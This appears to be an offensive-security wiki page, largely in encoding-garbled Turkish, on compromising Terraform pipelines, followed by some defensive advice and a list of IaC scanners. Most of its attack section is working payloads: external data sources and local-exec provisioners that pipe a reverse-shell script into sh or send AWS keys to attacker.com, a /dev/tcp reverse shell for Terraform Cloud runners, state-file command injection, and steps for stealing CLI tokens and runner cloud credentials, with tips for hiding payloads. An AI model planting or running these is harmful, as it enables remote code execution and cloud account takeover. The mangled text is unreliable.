# Terraform GÃ¼venliÄŸi

{{#include ../banners/hacktricks-training.md}}

## Temel Bilgiler

[From the docs:](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform, sÃ¼rÃ¼mlenebilir, yeniden kullanÄ±labilir ve paylaÅŸÄ±labilir insan tarafÄ±ndan okunabilir yapÄ±landÄ±rma dosyalarÄ±nda hem bulut hem de kurum iÃ§i kaynaklarÄ± tanÄ±mlamanÄ±za izin veren bir **infrastructure as code tool**'dur. ArdÄ±ndan, tÃ¼m altyapÄ±nÄ±zÄ± yaÅŸam dÃ¶ngÃ¼sÃ¼ boyunca saÄŸlamak ve yÃ¶netmek iÃ§in tutarlÄ± bir iÅŸ akÄ±ÅŸÄ± kullanabilirsiniz. Terraform, compute, storage ve networking gibi dÃ¼ÅŸÃ¼k seviyeli bileÅŸenlerin yanÄ± sÄ±ra DNS girdileri ve SaaS Ã¶zellikleri gibi yÃ¼ksek seviyeli bileÅŸenleri de yÃ¶netebilir.

#### Terraform nasÄ±l Ã§alÄ±ÅŸÄ±r?

Terraform, bulut platformlarÄ±nda ve diÄŸer hizmetlerde kaynaklarÄ± onlarÄ±n uygulama programlama arayÃ¼zleri (API'ler) aracÄ±lÄ±ÄŸÄ±yla oluÅŸturur ve yÃ¶netir. Providers, Terraform'un eriÅŸilebilir bir API'ye sahip neredeyse her platform veya hizmetle Ã§alÄ±ÅŸmasÄ±nÄ± saÄŸlar.

![](<../images/image (177).png>)

HashiCorp ve Terraform topluluÄŸu, binlerce farklÄ± kaynak ve hizmet tÃ¼rÃ¼nÃ¼ yÃ¶netmek iÃ§in **1700'den fazla provider** yazdÄ± ve bu sayÄ± artmaya devam ediyor. TÃ¼m herkese aÃ§Ä±k provider'larÄ± [Terraform Registry](https://registry.terraform.io/) Ã¼zerinde bulabilirsiniz; Ã¶rneÄŸin Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog ve daha fazlasÄ±.

Terraform'Ä±n temel iÅŸ akÄ±ÅŸÄ± Ã¼Ã§ aÅŸamadan oluÅŸur:

- **Write:** KaynaklarÄ± tanÄ±mlarsÄ±nÄ±z; bunlar birden fazla cloud provider ve hizmeti kapsayabilir. Ã–rneÄŸin, gÃ¼venlik gruplarÄ± ve bir load balancer ile bir Virtual Private Cloud (VPC) aÄŸÄ±nda sanal makineler Ã¼zerinde bir uygulama daÄŸÄ±tmak iÃ§in bir konfigÃ¼rasyon oluÅŸturabilirsiniz.
- **Plan:** Terraform, mevcut altyapÄ± ve konfigÃ¼rasyonunuz temelinde oluÅŸturacaÄŸÄ±, gÃ¼ncelleyeceÄŸi veya sileceÄŸi altyapÄ±yÄ± tanÄ±mlayan bir yÃ¼rÃ¼tme planÄ± oluÅŸturur.
- **Apply:** OnaylandÄ±ÄŸÄ±nda, Terraform Ã¶nerilen iÅŸlemleri doÄŸru sÄ±rada, herhangi bir kaynak baÄŸÄ±mlÄ±lÄ±ÄŸÄ±nÄ± gÃ¶zeterek gerÃ§ekleÅŸtirir. Ã–rneÄŸin, bir VPC'nin Ã¶zelliklerini gÃ¼ncellerseniz ve o VPC'deki sanal makine sayÄ±sÄ±nÄ± deÄŸiÅŸtirirseniz, Terraform VPC'yi yeniden oluÅŸturduktan sonra sanal makineleri Ã¶lÃ§eklendirir.

![](<../images/image (215).png>)

### Terraform Lab

Sadece bilgisayarÄ±nÄ±za terraform'u kurun.

Here you have a [guide](https://learn.hashicorp.com/tutorials/terraform/install-cli) and here you have the [best way to download terraform](https://www.terraform.io/downloads).

## RCE in Terraform: config file poisoning

Terraform **doesn't have a platform exposing a web page or a network service** we can enumerate, therefore, the only way to compromise terraform is to **be able to add/modify terraform configuration files** or to **be able to modify the terraform state file** (see chapter below).

Ancak, terraform doÄŸru ÅŸekilde Ã§alÄ±ÅŸabilmesi iÃ§in farklÄ± konumlara **ayrÄ±calÄ±klÄ± eriÅŸime** sahip olacaÄŸÄ±ndan, ele geÃ§irildiÄŸinde Ã§ok **hassas bir bileÅŸen** olur.

Bir saldÄ±rganÄ±n terraform'un Ã§alÄ±ÅŸtÄ±ÄŸÄ± sistemi ele geÃ§irebilmesi iÃ§in en yaygÄ±n yol, terraform konfigÃ¼rasyonlarÄ±nÄ± depolayan repository'yi ele geÃ§irmektir; Ã§Ã¼nkÃ¼ eninde sonunda bu konfigÃ¼rasyonlar **yorumlanacaktÄ±r**.

AslÄ±nda, bir PR oluÅŸturulduktan sonra `terraform plan`/`apply` iÅŸlemlerini otomatik olarak Ã§alÄ±ÅŸtÄ±ran Ã§Ã¶zÃ¼mler bulunmaktadÄ±r; Ã¶rneÄŸin **Atlantis**:

{{#ref}}
atlantis-security.md
{{#endref}}

EÄŸer bir terraform dosyasÄ±nÄ± ele geÃ§irebilirseniz, birisi `terraform plan` veya `terraform apply` Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±nda RCE gerÃ§ekleÅŸtirebileceÄŸiniz farklÄ± yollar vardÄ±r.

### Terraform plan

Terraform plan, terraform'da en **Ã§ok kullanÄ±lan komuttur** ve terraform kullanan geliÅŸtiriciler/Ã§Ã¶zÃ¼mler bunu sÃ¼rekli Ã§aÄŸÄ±rÄ±r; bu yÃ¼zden **RCE elde etmenin en kolay yolu**, bir `terraform plan` sÄ±rasÄ±nda rastgele komutlar Ã§alÄ±ÅŸtÄ±racak ÅŸekilde bir terraform konfigÃ¼rasyon dosyasÄ±nÄ± zehirlemektir.

**Using an external provider**

Terraform, Terraform ile harici programlar arasÄ±nda arayÃ¼z saÄŸlamaya yarayan [`external` provider](https://registry.terraform.io/providers/hashicorp/external/latest/docs) sunar. `external` data source'unu bir `plan` sÄ±rasÄ±nda rastgele kod Ã§alÄ±ÅŸtÄ±rmak iÃ§in kullanabilirsiniz.

Bir terraform konfigÃ¼rasyon dosyasÄ±na aÅŸaÄŸÄ±dakine benzer bir ÅŸey enjekte etmek, `terraform plan` Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda bir rev shell Ã§alÄ±ÅŸtÄ±racaktÄ±r:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**Ã–zel provider kullanÄ±mÄ±**

Bir saldÄ±rgan, [custom provider](https://learn.hashicorp.com/tutorials/terraform/provider-setup)'Ä± [Terraform Registry](https://registry.terraform.io/)'ye gÃ¶nderebilir ve sonra bunu bir Ã¶zellik dalÄ±ndaki Terraform koduna ekleyebilir ([example from here](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
Provider `init` sÄ±rasÄ±nda indirilir ve `plan` Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda kÃ¶tÃ¼ amaÃ§lÄ± kodu Ã§alÄ±ÅŸtÄ±rÄ±r

Bir Ã¶rneÄŸini ÅŸu adreste bulabilirsiniz: [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

**Harici bir referans kullanma**

Bahsedilen her iki seÃ§enek de faydalÄ±dÄ±r ancak Ã§ok gizli deÄŸiller (ikincisi birinciden daha gizli fakat daha karmaÅŸÄ±ktÄ±r). Bu saldÄ±rÄ±yÄ± aÅŸaÄŸÄ±daki Ã¶nerileri izleyerek daha **gizli** bir ÅŸekilde gerÃ§ekleÅŸtirebilirsiniz:

- Rev shell'i doÄŸrudan terraform dosyasÄ±na eklemek yerine, rev shell iÃ§eren bir **harici kaynak yÃ¼kleyebilirsiniz**:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
You can find the rev shell code in [https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules](https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules)

- Harici kaynakta, repodaki bir branch iÃ§ine **terraform rev shell code in a branch**'i gizlemek iÃ§in **ref** Ã¶zelliÄŸini kullanÄ±n, Ã¶rneÄŸin: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

Terraform apply, tÃ¼m deÄŸiÅŸiklikleri uygulamak iÃ§in Ã§alÄ±ÅŸtÄ±rÄ±lacaktÄ±r; ayrÄ±ca RCE elde etmek iÃ§in **a malicious Terraform file with** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Tek yapmanÄ±z gereken, aÅŸaÄŸÄ±dakiler gibi bazÄ± payload'larÄ±n `main.tf` dosyasÄ±nda sonlanmasÄ±nÄ± saÄŸlamaktÄ±r:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Ã–nceki tekniÄŸin **Ã¶nerilerini** izleyin ve bu saldÄ±rÄ±yÄ± **harici referanslar kullanarak daha gizli bir ÅŸekilde** gerÃ§ekleÅŸtirin.

## Secrets Dumps

`terraform apply` Ã§alÄ±ÅŸtÄ±rarak terraform tarafÄ±ndan kullanÄ±lan **gizli deÄŸerlerin dÃ¶kÃ¼lmesini** saÄŸlayabilirsiniz; terraform dosyasÄ±na ÅŸu gibi bir ÅŸey ekleyerek:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Terraform State DosyalarÄ±nÄ± KÃ¶tÃ¼ye Kullanma

EÄŸer terraform state dosyalarÄ± Ã¼zerinde yazma izniniz varsa ancak terraform kodunu deÄŸiÅŸtiremiyorsanÄ±z, [**this research**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) dosyadan faydalanmak iÃ§in bazÄ± ilginÃ§ seÃ§enekler sunuyor. KonfigÃ¼rasyon dosyalarÄ± Ã¼zerinde yazma izniniz olsa bile, state dosyalarÄ± vektÃ¶rÃ¼nÃ¼ kullanmak genellikle Ã§ok daha sinsidir; `git` geÃ§miÅŸinde iz bÄ±rakmazsÄ±nÄ±z.

### RCE in Terraform: config file poisoning

It is possible to [create a custom provider](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) and just replace one of the providers in the terraform state file for the malicious one or add a fake resource referencing the malicious provider.

The provider [statefile-rce](https://registry.terraform.io/providers/offensive-actions/statefile-rce/latest) builds on the research and weaponizes this principle. You can add a fake resource and state the arbitrary bash command you want to run in the attribute `command`. When the `terraform` run is triggered, this will be read and executed in both the `terraform plan` and `terraform apply` steps. In case of the `terraform apply` step, `terraform` will delete the fake resource from the state file after executing your command, cleaning up after itself. More information and a full demo can be found in the [GitHub repository hosting the source code for this provider](https://github.com/offensive-actions/terraform-provider-statefile-rce).

To use it directly, just include the following at any position of the `resources` array and customize the `name` and the `command` attributes:
```json
{
"mode": "managed",
"type": "rce",
"name": "<arbitrary_name>",
"provider": "provider[\"registry.terraform.io/offensive-actions/statefile-rce\"]",
"instances": [
{
"schema_version": 0,
"attributes": {
"command": "<arbitrary_command>",
"id": "rce"
},
"sensitive_attributes": [],
"private": "bnVsbA=="
}
]
}
```
SonrasÄ±nda, `terraform` Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r Ã§alÄ±ÅŸtÄ±rÄ±lmaz kodunuz Ã§alÄ±ÅŸÄ±r.

### KaynaklarÄ± silme <a href="#deleting-resources" id="deleting-resources"></a>

KaynaklarÄ± silmenin 2 yolu vardÄ±r:

1. **Yok edilecek gerÃ§ek kaynaÄŸa iÅŸaret eden rastgele isimli bir kaynaÄŸÄ± state dosyasÄ±na ekleyin**

Ã‡Ã¼nkÃ¼ `terraform` kaynaÄŸÄ±n var olmamasÄ± gerektiÄŸini gÃ¶recek ve onu (belirtilen gerÃ§ek resource ID'sine gÃ¶re) yok edecektir. Ã–nceki sayfadan Ã¶rnek:
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **KaynaÄŸÄ±, gÃ¼ncellenemeyecek ÅŸekilde deÄŸiÅŸtirin (bÃ¶ylece silinip yeniden oluÅŸturulacak)**

Bir EC2 instance'Ä± iÃ§in, instance tÃ¼rÃ¼nÃ¼ deÄŸiÅŸtirmek terraform'un onu silip yeniden oluÅŸturmasÄ±na yeterlidir.

### Kara listeye alÄ±nmÄ±ÅŸ provider'Ä± deÄŸiÅŸtir

`hashicorp/external` kara listeye alÄ±nmÄ±ÅŸ bir durumla karÅŸÄ±laÅŸÄ±rsanÄ±z, aÅŸaÄŸÄ±dakileri yaparak `external` provider'Ä± yeniden uygulayabilirsiniz. Not: Biz https://registry.terraform.io/providers/nazarewk/external/latest adresinde yayÄ±nlanan external provider'Ä±n bir fork'unu kullanÄ±yoruz. Kendi fork'unuzu veya yeniden uygulamanÄ±zÄ± da yayÄ±nlayabilirsiniz.
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
Sonra normal olduÄŸu gibi `external` kullanabilirsiniz.
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
## Terraform Cloud speculative plan RCE and credential exfiltration

Bu senaryo, Terraform Cloud (TFC) runner'larÄ±nÄ± speculative plans sÄ±rasÄ±nda kullanarak hedef cloud hesabÄ±na pivot yapar.

- Ã–nkoÅŸullar:
- GeliÅŸtirici bir makineden Terraform Cloud token'Ä± Ã§alÄ±n. CLI token'larÄ± dÃ¼z metin olarak `~/.terraform.d/credentials.tfrc.json` iÃ§inde saklar.
- Token, hedef organization/workspace'a eriÅŸimi olmalÄ± ve en az `plan` yetkisine sahip olmalÄ±dÄ±r. VCS-backed workspaces CLI'dan `apply`'Ä± engeller, ancak hÃ¢lÃ¢ speculative plans'e izin verir.

- Workspace ve VCS ayarlarÄ±nÄ± TFC API Ã¼zerinden keÅŸfedin:
```bash
export TF_TOKEN=<stolen_token>
curl -s -H "Authorization: Bearer $TF_TOKEN" \
https://app.terraform.io/api/v2/organizations/<org>/workspaces/<workspace> | jq
```
- VCS-backed workspace'Ä± hedeflemek iÃ§in external data source ve Terraform Cloud "cloud" bloÄŸunu kullanarak speculative plan sÄ±rasÄ±nda code execution tetikleyin:
```hcl
terraform {
cloud {
organization = "acmecorp"
workspaces { name = "gcp-infra-prod" }
}
}

data "external" "exec" {
program = ["bash", "./rsync.sh"]
}
```
TFC runner Ã¼zerinde reverse shell elde etmek iÃ§in Ã¶rnek rsync.sh:
```bash
#!/usr/bin/env bash
bash -c 'exec bash -i >& /dev/tcp/attacker.com/19863 0>&1'
```
GeÃ§ici runner Ã¼zerinde programÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in spekÃ¼latif bir plan Ã§alÄ±ÅŸtÄ±r:
```bash
terraform init
terraform plan
```
- Runner'dan enjekte edilmiÅŸ cloud credentials'leri enumerate ve exfiltrate edin. Ã‡alÄ±ÅŸma sÄ±rasÄ±nda, TFC provider credentials'leri files ve environment variables aracÄ±lÄ±ÄŸÄ±yla inject eder:
```bash
env | grep -i gcp || true
env | grep -i aws || true
```
Runner Ã§alÄ±ÅŸma dizininde beklenen dosyalar:
- GCP:
- `tfc-google-application-credentials` (Workload Identity Federation JSON yapÄ±landÄ±rmasÄ±)
- `tfc-gcp-token` (kÄ±sa Ã¶mÃ¼rlÃ¼ GCP eriÅŸim tokenÄ±)
- AWS:
- `tfc-aws-shared-config` (web identity/OIDC rol devralma yapÄ±landÄ±rmasÄ±)
- `tfc-aws-token` (kÄ±sa Ã¶mÃ¼rlÃ¼ token; bazÄ± kuruluÅŸlar statik anahtarlar kullanabilir)

- VCS gate'lerini atlatmak iÃ§in kÄ±sa Ã¶mÃ¼rlÃ¼ kimlik bilgilerini out-of-band kullanÄ±n:

GCP (gcloud):
```bash
export GOOGLE_APPLICATION_CREDENTIALS=./tfc-google-application-credentials
gcloud auth login --cred-file="$GOOGLE_APPLICATION_CREDENTIALS"
gcloud config set project <PROJECT_ID>
```
AWS (AWS CLI):
```bash
export AWS_CONFIG_FILE=./tfc-aws-shared-config
export AWS_PROFILE=default
aws sts get-caller-identity
```
With these creds, attackers can create/modify/destroy resources directly using native CLIs, sidestepping PR-based workflows that block `apply` via VCS.

- Savunma Ã¶nerileri:
- TFC kullanÄ±cÄ±larÄ±/takÄ±mlarÄ± ve tokenlar iÃ§in en az ayrÄ±calÄ±k ilkesini uygulayÄ±n. Ãœyelikleri denetleyin ve aÅŸÄ±rÄ± geniÅŸ sahiplikteki hesaplardan kaÃ§Ä±nÄ±n.
- MÃ¼mkÃ¼nse hassas VCS-backed workspaces'lerde `plan` iznini kÄ±sÄ±tlayÄ±n.
- Sentinel politikalarÄ±yla provider/data source allowlist'lerini uygulayarak `data "external"` veya bilinmeyen provider'larÄ± engelleyin. Provider filtreleme konusunda HashiCorp rehberine bakÄ±n.
- Statik cloud kimlik bilgileri yerine OIDC/WIF'i tercih edin; runners'larÄ± hassas kabul edin. SpekÃ¼latif plan Ã§alÄ±ÅŸtÄ±rmalarÄ±nÄ± ve beklenmeyen egress'i izleyin.
- `tfc-*` credential artifacts exfiltration'Ä±nÄ± tespit edin ve planlar sÄ±rasÄ±nda ÅŸÃ¼pheli `external` program kullanÄ±mÄ±nda uyarÄ± verin.


## Terraform Cloud'un ele geÃ§irilmesi

### Token kullanÄ±mÄ±

As **[explained in this post](https://www.pentestpartners.com/security-blog/terraform-token-abuse-speculative-plan/)**, terraform CLI stores tokens in plaintext at **`~/.terraform.d/credentials.tfrc.json`**. Stealing this token lets an attacker impersonate the user within the tokenâ€™s scope.

Using this token it's possible to get the org/workspace with:
```bash
GET https://app.terraform.io/api/v2/organizations/acmecorp/workspaces/gcp-infra-prod
Authorization: Bearer <TF_TOKEN>
```
BÃ¶ylece Ã¶nceki bÃ¶lÃ¼mde aÃ§Ä±klandÄ±ÄŸÄ± gibi **`terraform plan`** kullanÄ±larak rastgele kod Ã§alÄ±ÅŸtÄ±rmak mÃ¼mkÃ¼n olur.

### Escaping to the cloud

EÄŸer runner bir cloud ortamÄ±nda bulunuyorsa, runner'a baÄŸlÄ± principal'in bir token'Ä±nÄ± elde etmek ve bunu kanal dÄ±ÅŸÄ± kullanmak mÃ¼mkÃ¼n olur.

- **GCP files (present in current run working directory)**
- `tfc-google-application-credentials` â€” Workload Identity Federation(WIF) iÃ§in Google'a dÄ±ÅŸ kimliÄŸi nasÄ±l deÄŸiÅŸ tokuÅŸ edeceÄŸini sÃ¶yleyen JSON yapÄ±landÄ±rmasÄ±.
- `tfc-gcp-token` â€” yukarÄ±da bahsedileni referans alan kÄ±sa Ã¶mÃ¼rlÃ¼ (â‰ˆ1 saat) GCP eriÅŸim token'Ä±

- **AWS files**
- `tfc-aws-shared-config` â€” web identity federation/OIDC rol Ã¼stlenme iÃ§in JSON (statik anahtarlara tercih edilir).
- `tfc-aws-token` â€” kÄ±sa Ã¶mÃ¼rlÃ¼ token, veya yanlÄ±ÅŸ yapÄ±landÄ±rÄ±ldÄ±ÄŸÄ±nda potansiyel olarak statik IAM anahtarlarÄ±.


## Automatic Audit Tools

### [**Snyk Infrastructure as Code (IaC)**](https://snyk.io/product/infrastructure-as-code-security/)

Snyk, Terraform, CloudFormation, Kubernetes ve diÄŸer IaC formatlarÄ±ndaki zayÄ±flÄ±klarÄ± ve yanlÄ±ÅŸ yapÄ±landÄ±rmalarÄ± tespit eden kapsamlÄ± bir Infrastructure as Code (IaC) tarama Ã§Ã¶zÃ¼mÃ¼ sunar.

- **Features:**
- GÃ¼venlik zafiyetleri ve uyumluluk sorunlarÄ± iÃ§in gerÃ§ek zamanlÄ± tarama.
- SÃ¼rÃ¼m kontrol sistemleriyle entegrasyon (GitHub, GitLab, Bitbucket).
- Otomatik dÃ¼zeltme pull request'leri.
- DetaylÄ± dÃ¼zeltme Ã¶nerileri.
- **Sign Up:** Create an account on [Snyk](https://snyk.io/).
```bash
brew tap snyk/tap
brew install snyk
snyk auth
snyk iac test /path/to/terraform/code
```
### [Checkov](https://github.com/bridgecrewio/checkov) <a href="#install-checkov-from-pypi" id="install-checkov-from-pypi"></a>

**Checkov** is a static code analysis tool for infrastructure as code (IaC) and also a software composition analysis (SCA) tool for images and open source packages.

It scans cloud infrastructure provisioned using [Terraform](https://terraform.io/), [Terraform plan](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Terraform%20Plan%20Scanning.md), [Cloudformation](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Cloudformation.md), [AWS SAM](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/AWS%20SAM.md), [Kubernetes](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kubernetes.md), [Helm charts](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Helm.md), [Kustomize](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kustomize.md), [Dockerfile](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Dockerfile.md), [Serverless](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Serverless%20Framework.md), [Bicep](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Bicep.md), [OpenAPI](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/OpenAPI.md), [ARM Templates](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Azure%20ARM%20templates.md), or [OpenTofu](https://opentofu.org/) and detects security and compliance misconfigurations using graph-based scanning.

It performs [Software Composition Analysis (SCA) scanning](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Sca.md) which is a scan of open source packages and images for Common Vulnerabilities and Exposures (CVEs).
```bash
pip install checkov
checkov -d /path/to/folder
```
### [terraform-compliance](https://github.com/terraform-compliance/cli)

From the [**docs**](https://github.com/terraform-compliance/cli): `terraform-compliance` terraform'a karÅŸÄ± hafif, gÃ¼venlik ve uyumluluk odaklÄ± bir test framework'Ã¼dÃ¼r; Infrastructure-as-Code (IaC) iÃ§in negatif test yeteneÄŸi saÄŸlar.

- **uyumluluk:** Uygulanan kodun gÃ¼venlik standartlarÄ±na ve kendi Ã¶zel standartlarÄ±nÄ±za uygun olduÄŸunu doÄŸrulayÄ±n.
- **davranÄ±ÅŸ odaklÄ± geliÅŸtirme:** Neredeyse her ÅŸey iÃ§in BDD var, peki IaC iÃ§in neden olmasÄ±n?
- **taÅŸÄ±nabilir:** Sadece `pip` ile yÃ¼kleyin veya `docker` ile Ã§alÄ±ÅŸtÄ±rÄ±n. Bkz. [Installation](https://terraform-compliance.com/pages/installation/)
- **daÄŸÄ±tÄ±mdan Ã¶nce:** Kodunuzu daÄŸÄ±tÄ±lmadan Ã¶nce doÄŸrular.
- **entegrasyonu kolay:** Pipeline'Ä±nÄ±zda (veya git hook'larÄ±nda) Ã§alÄ±ÅŸtÄ±rÄ±labilir, bÃ¶ylece tÃ¼m daÄŸÄ±tÄ±mlar doÄŸrulanÄ±r.
- **gÃ¶rev ayrÄ±mÄ±:** Testlerinizi ayrÄ± bir depoda tutabilirsiniz; sorumluluk ayrÄ± bir ekibe ait olabilir.

> [!NOTE]
> Ne yazÄ±k ki kod bazÄ± provider'larÄ± kullanÄ±yorsa ve bunlara eriÅŸiminiz yoksa `terraform plan` yapamaz ve bu aracÄ± Ã§alÄ±ÅŸtÄ±ramazsÄ±nÄ±z.
```bash
pip install terraform-compliance
terraform plan -out=plan.out
terraform-compliance -f /path/to/folder
```
### [tfsec](https://github.com/aquasecurity/tfsec)

Kaynak: [**docs**](https://github.com/aquasecurity/tfsec): tfsec, terraform kodunuzun statik analizini kullanarak potansiyel yanlÄ±ÅŸ yapÄ±landÄ±rmalarÄ± tespit eder.

- â˜ï¸ TÃ¼m bÃ¼yÃ¼k (ve bazÄ± kÃ¼Ã§Ã¼k) bulut saÄŸlayÄ±cÄ±larÄ± genelinde yanlÄ±ÅŸ yapÄ±landÄ±rmalarÄ± kontrol eder
- â›” YÃ¼zlerce yerleÅŸik kural
- ğŸª† ModÃ¼lleri tarar (yerel ve uzak)
- â• HCL ifadelerini ve literal deÄŸerleri deÄŸerlendirir
- â†ªï¸ Terraform fonksiyonlarÄ±nÄ± deÄŸerlendirir (Ã¶r. concat())
- ğŸ”— Terraform kaynaklarÄ± arasÄ±ndaki iliÅŸkileri deÄŸerlendirir
- ğŸ§° Terraform CDK ile uyumlu
- ğŸ™… KullanÄ±cÄ± tanÄ±mlÄ± Rego politikalarÄ±nÄ± uygular (ve zenginleÅŸtirir)
- ğŸ“ƒ Birden Ã§ok Ã§Ä±ktÄ± formatÄ±nÄ± destekler: lovely (varsayÄ±lan), JSON, SARIF, CSV, CheckStyle, JUnit, text, Gif.
- ğŸ› ï¸ YapÄ±landÄ±rÄ±labilir (CLI bayraklarÄ± ve/veya yapÄ±landÄ±rma dosyasÄ± aracÄ±lÄ±ÄŸÄ±yla)
- âš¡ Ã‡ok hÄ±zlÄ±, bÃ¼yÃ¼k depolarÄ± hÄ±zlÄ±ca tarayabilir
```bash
brew install tfsec
tfsec /path/to/folder
```
### [terrascan](https://github.com/tenable/terrascan)

Terrascan, Infrastructure as Code iÃ§in statik bir kod analizÃ¶rÃ¼dÃ¼r. Terrascan ÅŸunlarÄ± yapmanÄ±za olanak tanÄ±r:

- Kod olarak altyapÄ±yÄ± yanlÄ±ÅŸ yapÄ±landÄ±rmalar iÃ§in sorunsuzca tarar.
- SaÄŸlanan bulut altyapÄ±sÄ±nÄ±, gÃ¼venlik duruÅŸu sapmasÄ±na yol aÃ§an yapÄ±landÄ±rma deÄŸiÅŸiklikleri aÃ§Ä±sÄ±ndan izler ve gÃ¼venli duruÅŸa geri dÃ¶nmeyi saÄŸlar.
- GÃ¼venlik aÃ§Ä±klarÄ±nÄ± ve uyumluluk ihlallerini tespit eder.
- Bulut-native altyapÄ± saÄŸlanmadan Ã¶nce riskleri azaltÄ±r.
- Yerel olarak Ã§alÄ±ÅŸtÄ±rma veya CI\CD ile entegre etme esnekliÄŸi sunar.
```bash
brew install terrascan
terrascan scan -d /path/to/folder
```
### [KICKS](https://github.com/Checkmarx/kics)

Checkmarx tarafÄ±ndan geliÅŸtirilen **KICS** ile infrastructure-as-code uygulamalarÄ±nÄ±zÄ±n geliÅŸtirme dÃ¶ngÃ¼sÃ¼nde gÃ¼venlik aÃ§Ä±klarÄ±nÄ±, uyumluluk sorunlarÄ±nÄ± ve altyapÄ± yanlÄ±ÅŸ yapÄ±landÄ±rmalarÄ±nÄ± erken tespit edin.

**KICS**, **K**eeping **I**nfrastructure as **C**ode **S**ecure'Ä±n kÄ±saltmasÄ±dÄ±r; aÃ§Ä±k kaynaklÄ±dÄ±r ve herhangi bir cloud native proje iÃ§in olmazsa olmazdÄ±r.
```bash
docker run -t -v $(pwd):/path checkmarx/kics:latest scan -p /path -o "/path/"
```
### [Terrascan](https://github.com/tenable/terrascan)

Kaynak: [**docs**](https://github.com/tenable/terrascan): Terrascan, Infrastructure as Code iÃ§in statik bir kod analiz aracÄ±dÄ±r. Terrascan size ÅŸunlarÄ± saÄŸlar:

- Infrastructure as Code iÃ§indeki yapÄ±landÄ±rma hatalarÄ±nÄ± sorunsuzca tarama.
- SaÄŸlanan bulut altyapÄ±sÄ±nÄ±, yapÄ±landÄ±rma deÄŸiÅŸikliklerinin neden olduÄŸu posture drift iÃ§in izleme ve gÃ¼venli bir duruma geri dÃ¶nmeyi saÄŸlama.
- GÃ¼venlik aÃ§Ä±klarÄ±nÄ± ve uyumluluk ihlallerini tespit etme.
- Cloud native altyapÄ± saÄŸlanmadan Ã¶nce riskleri azaltma.
- Yerelde Ã§alÄ±ÅŸtÄ±rma veya CI\CD ile entegre etme esnekliÄŸi sunma.
```bash
brew install terrascan
```
## Referanslar

- [Atlantis Security](atlantis-security.md)
- [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
- [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
- [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)
- [https://github.com/offensive-actions/terraform-provider-statefile-rce](https://github.com/offensive-actions/terraform-provider-statefile-rce)
- [Terraform Cloud token abuse turns speculative plan into remote code execution](https://www.pentestpartners.com/security-blog/terraform-token-abuse-speculative-plan/)
- [Terraform Cloud permissions](https://developer.hashicorp.com/terraform/cloud-docs/users-teams-organizations/permissions)
- [Terraform Cloud API â€“ Show workspace](https://developer.hashicorp.com/terraform/cloud-docs/api-docs/workspaces#show-workspace)
- [AWS provider configuration](https://registry.terraform.io/providers/hashicorp/aws/latest/docs#provider-configuration)
- [AWS CLI â€“ OIDC role assumption](https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-role.html#cli-configure-role-oidc)
- [GCP provider â€“ Using Terraform Cloud](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider_reference.html#using-terraform-cloud)
- [Terraform â€“ Sensitive variables](https://developer.hashicorp.com/terraform/tutorials/configuration-language/sensitive-variables)
- [Snyk Labs â€“ Gitflops: dangers of Terraform automation platforms](https://labs.snyk.io/resources/gitflops-dangers-of-terraform-automation-platforms/)

{{#include ../banners/hacktricks-training.md}}
